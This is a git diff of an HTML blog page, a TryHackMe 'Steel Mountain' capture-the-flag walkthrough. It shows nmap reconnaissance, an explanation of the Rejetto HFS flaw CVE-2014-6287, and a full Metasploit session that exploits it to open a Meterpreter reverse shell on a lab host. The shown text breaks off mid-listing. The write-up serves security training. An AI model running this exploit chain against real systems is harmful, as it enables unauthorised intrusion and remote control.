@@ -3,7 +3,7 @@
   <head>
     <title>TryHackMe - Steel Mountain // FelSec - Blog</title>
     <meta charset="utf-8" />
-    <meta name="generator" content="Hugo 0.75.1" />
+    <meta name="generator" content="Hugo 0.105.0">
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <meta name="author" content="FelSec" />
     <meta name="description" content="" />
@@ -22,7 +22,6 @@ if (!doNotTrack) {
 	ga('send', 'pageview');
 }
 </script>
-
     <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="TryHackMe - Steel Mountain"/>
 <meta name="twitter:description" content="Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access."/>
@@ -30,9 +29,10 @@ if (!doNotTrack) {
     <meta property="og:title" content="TryHackMe - Steel Mountain" />
 <meta property="og:description" content="Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://felsec.com/posts/tryhackme-steelmountain/" />
+<meta property="og:url" content="https://felsec.com/posts/tryhackme-steelmountain/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2020-11-07T18:57:56+01:00" />
 <meta property="article:modified_time" content="2020-11-07T18:57:56+01:00" />
+
 
 
   </head>
@@ -100,70 +100,70 @@ if (!doNotTrack) {
 <strong><em>Link:</em></strong> <a href="https://www.tryhackme.com/room/steelmountain">https://www.tryhackme.com/room/steelmountain</a></p>
 <h2 id="information-gathering">Information Gathering</h2>
 <p>Let&rsquo;s get started with this room. After doing the necessary (spinning up the host, grabbing the IP and sticking it in a file for easy reference), our first activity is to scan the host to see what services we have available to play with.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">nmap -Pn -sV -iL host -oN kenobi.nmap
-
-Starting Nmap 7.60 ( https://nmap.org ) at 2020-07-25 14:12 BST
-Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
-SYN Stealth Scan Timing: About 99.99% done; ETC: 14:12 (0:00:00 remaining)
-Stats: 0:00:39 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
-Service scan Timing: About 50.00% done; ETC: 14:13 (0:00:26 remaining)
-Nmap scan report for 10.10.29.151
-Host is up (0.017s latency).
-Not shown: 988 closed ports
-PORT      STATE SERVICE      VERSION
-80/tcp    open  http         Microsoft IIS httpd 8.5
-135/tcp   open  msrpc        Microsoft Windows RPC
-139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
-445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
-3389/tcp  open  ssl          Microsoft SChannel TLS
-8080/tcp  open  http         HttpFileServer httpd 2.3
-49152/tcp open  msrpc        Microsoft Windows RPC
-49153/tcp open  msrpc        Microsoft Windows RPC
-49154/tcp open  msrpc        Microsoft Windows RPC
-49155/tcp open  msrpc        Microsoft Windows RPC
-49160/tcp open  msrpc        Microsoft Windows RPC
-49161/tcp open  msrpc        Microsoft Windows RPC
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port3389-TCP:V=7.60%I=7%D=7/25%Time=5F1C2FE3%P=x86_64-pc-linux-gnu%r(TL
-SF:SSessionReq,346,&#34;\x16\x03\x03\x03A\x02\0\0M\x03\x03_\x1c/\xdfg\xde\x99\
-SF:xca\x98\xb611\[E,z\xb9\x07\xa3\x97\x80\x19\x94\xdc\xf8\x16\x02\xa1t\xd9
-SF:\xaf\xce\x20\+\(\0\0\xcf\x8a\xb4ggUs\xd0\x12M\xe1\$\xd0\xce\x1a\)/\|\xb
-SF:3E&amp;\x8e\x14\t\x1c\xe4\x0b\x13\0/\0\0\x05\xff\x01\0\x01\0\x0b\0\x02\xe8\
-SF:0\x02\xe5\0\x02\xe20\x82\x02\xde0\x82\x01\xc6\xa0\x03\x02\x01\x02\x02\x
-SF:10b\xe38\x17\xc8T\xf6\x98B\xb7T\x88\xbe\x86\x8e\x900\r\x06\t\*\x86H\x86
-SF:\xf7\r\x01\x01\x05\x05\x000\x181\x160\x14\x06\x03U\x04\x03\x13\rsteelmo
-SF:untain0\x1e\x17\r200724125942Z\x17\r210123125942Z0\x181\x160\x14\x06\x0
-SF:3U\x04\x03\x13\rsteelmountain0\x82\x01\&#34;0\r\x06\t\*\x86H\x86\xf7\r\x01\
-SF:x01\x01\x05\0\x03\x82\x01\x0f\x000\x82\x01\n\x02\x82\x01\x01\0\xadQ\x80
-SF:\xe3\xd9G0P\xbaeNgv&gt;\xd4\xb8J\x06\xf9\x8b\x95\^V\]W9ET\xf1\xa201U\xa5\x
-SF:15\xdc\x9c\x11\xc88\x13\x8e9\x07\xe7\x057&amp;G\xc1\x16U\xce\xe5\xc5C\xf1\x
-SF:ed\xd3\xcf\?\xd0B\x0e&lt;\xfd\xe3\x8d\xc0\[xW\xc6\xca\xc3\xcdug\xcdM\xb3J\
-SF:x20&lt;\xc5\xbf\xa7\xafE\[\xaf\xd0\xa2tLA\x04\^\xc6\0=\xc5ya\xdb\x12\|\xf0
-SF:\x92\xcd\xd1_\xaf\xb2@:\xd0\xaf\xd6%\xca\x9b\x9a\x94\x1b\xa0\xf7q\xce\x
-SF:b8J:\xfa\xe36\xb9\xf9\n\xc1\xa85\x9a\xaf\xb3k\xa2\xed\x1e\x1a\x0f_P\xd6
-SF:,\xb2\x1a#\xfb\.\xda\x88N\xda\|\xbdq\x92\x04\x06&gt;l\(\xb8\xf5\xc0\x9d\xc
-SF:c,C\x0cp\x97ig\x98\.\xfdA\x97d\x0fL\xec\xff\x9b\xa4\x93\xb8\(\xd0\x04n\
-SF:xb9WG\xd0\xe9\x15\+\xa8I\x80\xc06V5\xac\x12\x88\x85k\xce\xdd\)\x08\xcah
-SF:\xe7X\x169\xedZ\x82\xa5M\xff\xa9\x95&amp;0R\xe2\x1f4\x91\tK\x13\x05\x8a\xd3
-SF:\x0fG\xadW\x02\x03\x01\0\x01\xa3\$0\&#34;0\x13\x06\x03U\x1d%\x04\x0c0\n\x06
-SF:\x08\+\x06\x01\x05\x05\x07\x03\x010\x0b\x06\x03U\x1d\x0f\x04\x04\x03\x0
-SF:2\x0400\r\x06\t\*\x86H\x86\xf7\r\x01\x01\x05\x05\0\x03\x82\x01\x01\0M=\
-SF:xbc\*jvzxW\xcb\xf0\xe4\xa6Ws\xb2\x9dr&amp;\$\^\r\xcc\xab\xa1\xe7l\xc53\xa4o
-SF::uw\xb1\xe3S9\xc7\xf4\x04pt&#39;`\xdc\xfby\x82\xfd\xf6\xf5\xbc\(\x1a\xfaA\x
-SF:e6P&amp;Z\x82%p3\x17\x80\xee\xcf\xe3\x8d!\x91{\xce\x91\xad\xd3\x9a50\xe9\xe
-SF:7\x20\nl\x97\xd7\x0c\xf74\n%\x88W\xc4\xc4\xed\x95\xc8\xa3\t\xb0\x7f\x8b
-SF:\xea/\xab\xd2F\x7f`CV\x18p\x91#f\xb5@\xb8\xc0\xfb7\xb0\xab%\xa5\x83\xfe
-SF:\xebM\)\xef\xd1\x95&gt;\x11Avt\xe0\xe9\x06\xcb\xa5x\xce\x12\xa3G6&gt;P,;\xa8\
-SF:x84\xd9\xb6\xd6\xc2\x08\xa7}_\xb6\?\x11\x8d\xf7\xf0_\xec\xa8c7\x80p\xc1
-SF:\xfc\x08L\x17\x98\x0b\t\x1a\x7f\xe3\xd7\xb1\xae\xfb\x8f\xa0\xc3v\&#34;\xd6\
-SF:x924J\x05\x9a\x95\xdcBO\xe6\xc7\xa7\x20\xf5\xb2S\x8a\$\x08\xe0\x90\xcd\
-SF:x81~l\x82\xb4\x97\x02\xa4&lt;\xa3L3\xeco\x13c\xa1\xff2r\xd0\xf8s\x0f\xf3\x
-SF:a1KR8\xfcf=n\x0e\0\0\0&#34;);
-Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 72.73 seconds
-</code></pre></div><p>Looking at the nmap output we can see that we have about 12 services open to us, the output also tells us that this is a Windows server.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>nmap -Pn -sV -iL host -oN kenobi.nmap
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Starting Nmap 7.60 ( https://nmap.org ) at 2020-07-25 14:12 BST
+</span></span><span style="display:flex;"><span>Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+</span></span><span style="display:flex;"><span>SYN Stealth Scan Timing: About 99.99% done; ETC: 14:12 (0:00:00 remaining)
+</span></span><span style="display:flex;"><span>Stats: 0:00:39 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+</span></span><span style="display:flex;"><span>Service scan Timing: About 50.00% done; ETC: 14:13 (0:00:26 remaining)
+</span></span><span style="display:flex;"><span>Nmap scan report for 10.10.29.151
+</span></span><span style="display:flex;"><span>Host is up (0.017s latency).
+</span></span><span style="display:flex;"><span>Not shown: 988 closed ports
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE      VERSION
+</span></span><span style="display:flex;"><span>80/tcp    open  http         Microsoft IIS httpd 8.5
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+</span></span><span style="display:flex;"><span>3389/tcp  open  ssl          Microsoft SChannel TLS
+</span></span><span style="display:flex;"><span>8080/tcp  open  http         HttpFileServer httpd 2.3
+</span></span><span style="display:flex;"><span>49152/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49153/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49154/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49155/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49160/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49161/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span style="display:flex;"><span>SF-Port3389-TCP:V=7.60%I=7%D=7/25%Time=5F1C2FE3%P=x86_64-pc-linux-gnu%r(TL
+</span></span><span style="display:flex;"><span>SF:SSessionReq,346,&#34;\x16\x03\x03\x03A\x02\0\0M\x03\x03_\x1c/\xdfg\xde\x99\
+</span></span><span style="display:flex;"><span>SF:xca\x98\xb611\[E,z\xb9\x07\xa3\x97\x80\x19\x94\xdc\xf8\x16\x02\xa1t\xd9
+</span></span><span style="display:flex;"><span>SF:\xaf\xce\x20\+\(\0\0\xcf\x8a\xb4ggUs\xd0\x12M\xe1\$\xd0\xce\x1a\)/\|\xb
+</span></span><span style="display:flex;"><span>SF:3E&amp;\x8e\x14\t\x1c\xe4\x0b\x13\0/\0\0\x05\xff\x01\0\x01\0\x0b\0\x02\xe8\
+</span></span><span style="display:flex;"><span>SF:0\x02\xe5\0\x02\xe20\x82\x02\xde0\x82\x01\xc6\xa0\x03\x02\x01\x02\x02\x
+</span></span><span style="display:flex;"><span>SF:10b\xe38\x17\xc8T\xf6\x98B\xb7T\x88\xbe\x86\x8e\x900\r\x06\t\*\x86H\x86
+</span></span><span style="display:flex;"><span>SF:\xf7\r\x01\x01\x05\x05\x000\x181\x160\x14\x06\x03U\x04\x03\x13\rsteelmo
+</span></span><span style="display:flex;"><span>SF:untain0\x1e\x17\r200724125942Z\x17\r210123125942Z0\x181\x160\x14\x06\x0
+</span></span><span style="display:flex;"><span>SF:3U\x04\x03\x13\rsteelmountain0\x82\x01\&#34;0\r\x06\t\*\x86H\x86\xf7\r\x01\
+</span></span><span style="display:flex;"><span>SF:x01\x01\x05\0\x03\x82\x01\x0f\x000\x82\x01\n\x02\x82\x01\x01\0\xadQ\x80
+</span></span><span style="display:flex;"><span>SF:\xe3\xd9G0P\xbaeNgv&gt;\xd4\xb8J\x06\xf9\x8b\x95\^V\]W9ET\xf1\xa201U\xa5\x
+</span></span><span style="display:flex;"><span>SF:15\xdc\x9c\x11\xc88\x13\x8e9\x07\xe7\x057&amp;G\xc1\x16U\xce\xe5\xc5C\xf1\x
+</span></span><span style="display:flex;"><span>SF:ed\xd3\xcf\?\xd0B\x0e&lt;\xfd\xe3\x8d\xc0\[xW\xc6\xca\xc3\xcdug\xcdM\xb3J\
+</span></span><span style="display:flex;"><span>SF:x20&lt;\xc5\xbf\xa7\xafE\[\xaf\xd0\xa2tLA\x04\^\xc6\0=\xc5ya\xdb\x12\|\xf0
+</span></span><span style="display:flex;"><span>SF:\x92\xcd\xd1_\xaf\xb2@:\xd0\xaf\xd6%\xca\x9b\x9a\x94\x1b\xa0\xf7q\xce\x
+</span></span><span style="display:flex;"><span>SF:b8J:\xfa\xe36\xb9\xf9\n\xc1\xa85\x9a\xaf\xb3k\xa2\xed\x1e\x1a\x0f_P\xd6
+</span></span><span style="display:flex;"><span>SF:,\xb2\x1a#\xfb\.\xda\x88N\xda\|\xbdq\x92\x04\x06&gt;l\(\xb8\xf5\xc0\x9d\xc
+</span></span><span style="display:flex;"><span>SF:c,C\x0cp\x97ig\x98\.\xfdA\x97d\x0fL\xec\xff\x9b\xa4\x93\xb8\(\xd0\x04n\
+</span></span><span style="display:flex;"><span>SF:xb9WG\xd0\xe9\x15\+\xa8I\x80\xc06V5\xac\x12\x88\x85k\xce\xdd\)\x08\xcah
+</span></span><span style="display:flex;"><span>SF:\xe7X\x169\xedZ\x82\xa5M\xff\xa9\x95&amp;0R\xe2\x1f4\x91\tK\x13\x05\x8a\xd3
+</span></span><span style="display:flex;"><span>SF:\x0fG\xadW\x02\x03\x01\0\x01\xa3\$0\&#34;0\x13\x06\x03U\x1d%\x04\x0c0\n\x06
+</span></span><span style="display:flex;"><span>SF:\x08\+\x06\x01\x05\x05\x07\x03\x010\x0b\x06\x03U\x1d\x0f\x04\x04\x03\x0
+</span></span><span style="display:flex;"><span>SF:2\x0400\r\x06\t\*\x86H\x86\xf7\r\x01\x01\x05\x05\0\x03\x82\x01\x01\0M=\
+</span></span><span style="display:flex;"><span>SF:xbc\*jvzxW\xcb\xf0\xe4\xa6Ws\xb2\x9dr&amp;\$\^\r\xcc\xab\xa1\xe7l\xc53\xa4o
+</span></span><span style="display:flex;"><span>SF::uw\xb1\xe3S9\xc7\xf4\x04pt&#39;`\xdc\xfby\x82\xfd\xf6\xf5\xbc\(\x1a\xfaA\x
+</span></span><span style="display:flex;"><span>SF:e6P&amp;Z\x82%p3\x17\x80\xee\xcf\xe3\x8d!\x91{\xce\x91\xad\xd3\x9a50\xe9\xe
+</span></span><span style="display:flex;"><span>SF:7\x20\nl\x97\xd7\x0c\xf74\n%\x88W\xc4\xc4\xed\x95\xc8\xa3\t\xb0\x7f\x8b
+</span></span><span style="display:flex;"><span>SF:\xea/\xab\xd2F\x7f`CV\x18p\x91#f\xb5@\xb8\xc0\xfb7\xb0\xab%\xa5\x83\xfe
+</span></span><span style="display:flex;"><span>SF:\xebM\)\xef\xd1\x95&gt;\x11Avt\xe0\xe9\x06\xcb\xa5x\xce\x12\xa3G6&gt;P,;\xa8\
+</span></span><span style="display:flex;"><span>SF:x84\xd9\xb6\xd6\xc2\x08\xa7}_\xb6\?\x11\x8d\xf7\xf0_\xec\xa8c7\x80p\xc1
+</span></span><span style="display:flex;"><span>SF:\xfc\x08L\x17\x98\x0b\t\x1a\x7f\xe3\xd7\xb1\xae\xfb\x8f\xa0\xc3v\&#34;\xd6\
+</span></span><span style="display:flex;"><span>SF:x924J\x05\x9a\x95\xdcBO\xe6\xc7\xa7\x20\xf5\xb2S\x8a\$\x08\xe0\x90\xcd\
+</span></span><span style="display:flex;"><span>SF:x81~l\x82\xb4\x97\x02\xa4&lt;\xa3L3\xeco\x13c\xa1\xff2r\xd0\xf8s\x0f\xf3\x
+</span></span><span style="display:flex;"><span>SF:a1KR8\xfcf=n\x0e\0\0\0&#34;);
+</span></span><span style="display:flex;"><span>Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap done: 1 IP address (1 host up) scanned in 72.73 seconds
+</span></span></code></pre></div><p>Looking at the nmap output we can see that we have about 12 services open to us, the output also tells us that this is a Windows server.</p>
 <p>Let&rsquo;s open up the website on port 80 in a browser and see what we find&hellip;</p>
 <p><img src="/posts/sm/1-webpage.png" alt="Steel Mountain Website - Bill Harper"></p>
 <p>An intersting page, but it just looks like an Employee of the Month. Looking at the source code for the page we can see that the guy in the image is Bill Harper.</p>
@@ -173,351 +173,351 @@ Nmap done: 1 IP address (1 host up) scanned in 72.73 seconds
 <p><img src="/posts/sm/3-hfs-homepage.png" alt="Steel Mountain HFS Homepage"></p>
 <p>After grabbing the version from the webpage and doing a bit of searching, we find that the service is vulnerable to a number of issues including a couple of Remote Code Execution flaws.</p>
 <p>One particular flaw we are interested in is CVE-2014-6287. The flaw exists within a parser library (ParserLib.pas) used by the application that does not adequately sanitise user input before passing it to a regeular expression function.</p>
-<pre><code class="language-vbs" data-lang="vbs">function findMacroMarker(s:string; ofs:integer=1):integer;
-begin result:=reMatch(s, '\{[.:]|[.:]\}|\|', 'm!', ofs) end;
+<pre tabindex="0"><code class="language-vbs" data-lang="vbs">function findMacroMarker(s:string; ofs:integer=1):integer;
+begin result:=reMatch(s, &#39;\{[.:]|[.:]\}|\|&#39;, &#39;m!&#39;, ofs) end;
 </code></pre><p>By sending a null (%00) character within a search string it is possible to stop the regex function from parsing the input and instead allowing the macro to execute the arbitrary code.</p>
 <p>Using this we can get a remote shell on the server. We will use Metasploit to make it easier this time, but there are other ways of doing it.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">msf5 &gt; search rejetto
-
-Matching Modules
-================
-
-   #  Name                                   Disclosure Date  Rank       Check  Description
-   -  ----                                   ---------------  ----       -----  -----------
-   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
-
-
-msf5 &gt; use 0
-[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
-msf5 exploit(windows/http/rejetto_hfs_exec) &gt; options
-
-Module options (exploit/windows/http/rejetto_hfs_exec):
-
-   Name       Current Setting  Required  Description
-   ----       ---------------  --------  -----------
-   HTTPDELAY  10               no        Seconds to wait before terminating web server
-   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
-   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
-   RPORT      80               yes       The target port (TCP)
-   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
-   SRVPORT    8080             yes       The local port to listen on.
-   SSL        false            no        Negotiate SSL/TLS for outgoing connections
-   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
-   TARGETURI  /                yes       The path of the web application
-   URIPATH                     no        The URI to use for this exploit (default is random)
-   VHOST                       no        HTTP server virtual host
-
-
-Payload options (windows/meterpreter/reverse_tcp):
-
-   Name      Current Setting  Required  Description
-   ----      ---------------  --------  -----------
-   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
-   LHOST     192.168.1.114    yes       The listen address (an interface may be specified)
-   LPORT     4444             yes       The listen port
-
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   0   Automatic
-
-
-msf5 exploit(windows/http/rejetto_hfs_exec) &gt; set LHOST tun0
-LHOST =&gt; tun0
-msf5 exploit(windows/http/rejetto_hfs_exec) &gt; options
-
-Module options (exploit/windows/http/rejetto_hfs_exec):
-
-   Name       Current Setting  Required  Description
-   ----       ---------------  --------  -----------
-   HTTPDELAY  10               no        Seconds to wait before terminating web server
-   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
-   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
-   RPORT      80               yes       The target port (TCP)
-   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
-   SRVPORT    8080             yes       The local port to listen on.
-   SSL        false            no        Negotiate SSL/TLS for outgoing connections
-   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
-   TARGETURI  /                yes       The path of the web application
-   URIPATH                     no        The URI to use for this exploit (default is random)
-   VHOST                       no        HTTP server virtual host
-
-
-Payload options (windows/meterpreter/reverse_tcp):
-
-   Name      Current Setting  Required  Description
-   ----      ---------------  --------  -----------
-   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
-   LHOST     tun0             yes       The listen address (an interface may be specified)
-   LPORT     4444             yes       The listen port
-
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   0   Automatic
-
-
-msf5 exploit(windows/http/rejetto_hfs_exec) &gt; set RHOSTS 10.10.29.$IP
-RHOSTS =&gt; $IP
-msf5 exploit(windows/http/rejetto_hfs_exec) &gt; options
-
-Module options (exploit/windows/http/rejetto_hfs_exec):
-
-   Name       Current Setting  Required  Description
-   ----       ---------------  --------  -----------
-   HTTPDELAY  10               no        Seconds to wait before terminating web server
-   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
-   RHOSTS     $IP              yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
-   RPORT      80               yes       The target port (TCP)
-   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
-   SRVPORT    8080             yes       The local port to listen on.
-   SSL        false            no        Negotiate SSL/TLS for outgoing connections
-   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
-   TARGETURI  /                yes       The path of the web application
-   URIPATH                     no        The URI to use for this exploit (default is random)
-   VHOST                       no        HTTP server virtual host
-
-
-Payload options (windows/meterpreter/reverse_tcp):
-
-   Name      Current Setting  Required  Description
-   ----      ---------------  --------  -----------
-   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
-   LHOST     tun0             yes       The listen address (an interface may be specified)
-   LPORT     4444             yes       The listen port
-
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   0   Automatic
-
-
-msf5 exploit(windows/http/rejetto_hfs_exec) &gt; options set RHOSTS $IP10.10.29.151
-RHOSTS =&gt; 10.10.29.151
-msf5 exploit(windows/http/rejetto_hfs_exec) &gt; set RPORT 8080
-RPORT =&gt; 8080
-msf5 exploit(windows/http/rejetto_hfs_exec) &gt; exploit
-
-[*] Started reverse TCP handler on 10.8.7.19:4444
-[*] Using URL: http://0.0.0.0:8080/6q6f8cxkkYZZ1Bf
-[*] Local IP: http://10.8.7.19:8080/6q6f8cxkkYZZ1Bf
-[*] Server started.
-[*] Sending a malicious request to /
-[*] Payload request received: /6q6f8cxkkYZZ1Bf
-[*] Sending stage (176195 bytes) to 10.10.29.151
-[*] Meterpreter session 1 opened (10.8.7.19:4444 -&gt; 10.10.29.151:49403) at 2020-07-25 14:33:52 +0100
-[!] Tried to delete %TEMP%\uZSLPzm.vbs, unknown result
-[*] Server stopped.
-
-meterpreter &gt; sysinfo
-Computer        : STEELMOUNTAIN
-OS              : Windows 2012 R2 (6.3 Build 9600).
-Architecture    : x64
-System Language : en_US
-Domain          : WORKGROUP
-Logged On Users : 1
-Meterpreter     : x86/windows
-meterpreter &gt;
-</code></pre></div><p>Fantastic! We now have a remote shell on the server as a standard user.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>msf5 &gt; search rejetto
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Matching Modules
+</span></span><span style="display:flex;"><span>================
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   #  Name                                   Disclosure Date  Rank       Check  Description
+</span></span><span style="display:flex;"><span>   -  ----                                   ---------------  ----       -----  -----------
+</span></span><span style="display:flex;"><span>   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf5 &gt; use 0
+</span></span><span style="display:flex;"><span>[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+</span></span><span style="display:flex;"><span>msf5 exploit(windows/http/rejetto_hfs_exec) &gt; options
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Module options (exploit/windows/http/rejetto_hfs_exec):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name       Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----       ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>   HTTPDELAY  10               no        Seconds to wait before terminating web server
+</span></span><span style="display:flex;"><span>   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+</span></span><span style="display:flex;"><span>   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
+</span></span><span style="display:flex;"><span>   RPORT      80               yes       The target port (TCP)
+</span></span><span style="display:flex;"><span>   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+</span></span><span style="display:flex;"><span>   SRVPORT    8080             yes       The local port to listen on.
+</span></span><span style="display:flex;"><span>   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+</span></span><span style="display:flex;"><span>   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+</span></span><span style="display:flex;"><span>   TARGETURI  /                yes       The path of the web application
+</span></span><span style="display:flex;"><span>   URIPATH                     no        The URI to use for this exploit (default is random)
+</span></span><span style="display:flex;"><span>   VHOST                       no        HTTP server virtual host
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Payload options (windows/meterpreter/reverse_tcp):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name      Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----      ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
+</span></span><span style="display:flex;"><span>   LHOST     192.168.1.114    yes       The listen address (an interface may be specified)
+</span></span><span style="display:flex;"><span>   LPORT     4444             yes       The listen port
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Exploit target:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Id  Name
+</span></span><span style="display:flex;"><span>   --  ----
+</span></span><span style="display:flex;"><span>   0   Automatic
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf5 exploit(windows/http/rejetto_hfs_exec) &gt; set LHOST tun0
+</span></span><span style="display:flex;"><span>LHOST =&gt; tun0
+</span></span><span style="display:flex;"><span>msf5 exploit(windows/http/rejetto_hfs_exec) &gt; options
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Module options (exploit/windows/http/rejetto_hfs_exec):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name       Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----       ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>   HTTPDELAY  10               no        Seconds to wait before terminating web server
+</span></span><span style="display:flex;"><span>   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+</span></span><span style="display:flex;"><span>   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
+</span></span><span style="display:flex;"><span>   RPORT      80               yes       The target port (TCP)
+</span></span><span style="display:flex;"><span>   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+</span></span><span style="display:flex;"><span>   SRVPORT    8080             yes       The local port to listen on.
+</span></span><span style="display:flex;"><span>   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+</span></span><span style="display:flex;"><span>   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+</span></span><span style="display:flex;"><span>   TARGETURI  /                yes       The path of the web application
+</span></span><span style="display:flex;"><span>   URIPATH                     no        The URI to use for this exploit (default is random)
+</span></span><span style="display:flex;"><span>   VHOST                       no        HTTP server virtual host
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Payload options (windows/meterpreter/reverse_tcp):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name      Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----      ---------------  --------  -----------
